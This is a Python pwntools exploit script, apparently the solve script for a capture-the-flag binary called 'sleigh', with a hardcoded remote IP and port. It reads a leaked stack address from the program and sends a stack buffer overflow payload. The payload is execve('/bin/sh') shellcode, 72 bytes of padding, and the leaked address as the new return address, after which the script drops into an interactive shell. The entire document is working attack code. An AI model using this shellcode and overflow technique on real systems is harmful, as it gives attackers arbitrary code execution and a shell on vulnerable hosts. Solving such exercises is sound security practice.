from pwn import *

host = "178.62.123.156"
port = 31694

offset = 72
pop_rdi = 0x0000000000000c63
ret = 0x000000000000076e
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

elf = ELF("./sleigh")
s = elf.process()
# s = remote(host, port)

print(s.recvuntil(b"> ").decode())
print("1")
s.sendline(b"1")

print(s.recvuntil(b"There is something written underneath the sleigh: [").decode())

leakVariable = int(s.recvline(b"]").strip(b"]\n"), 16)

log.info(f"leak address of variable: {hex(leakVariable)}")

payload = shellcode
payload += b"A"*(offset-len(shellcode))
payload += p64(leakVariable)

print(payload)
s.sendline(payload)

s.interactive()

s.close()